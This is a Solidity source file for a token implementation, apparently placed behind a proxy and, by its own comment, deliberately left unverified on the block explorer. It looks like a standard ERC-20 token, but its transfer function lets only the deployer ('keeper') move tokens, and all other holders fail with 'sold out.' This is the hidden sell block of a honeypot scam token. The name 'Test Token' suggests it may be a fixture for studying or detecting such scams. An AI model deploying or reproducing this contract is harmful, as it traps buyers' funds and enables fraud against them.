// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// The implementation behind OpenProxy. Deliberately left unverified on the explorer.
contract SecretImpl {
    string public name;
    string public symbol;
    uint256 public totalSupply;
    address private keeper;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function init() external {
        require(keeper == address(0), "done");
        keeper = msg.sender;
        name = "Proxied Test Token";
        symbol = "PROXY";
        totalSupply = 1_000_000 * 1e18;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function decimals() external pure returns (uint8) { return 18; }

    function transfer(address to, uint256 value) external returns (bool) {
        require(msg.sender == keeper, "sold out");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}
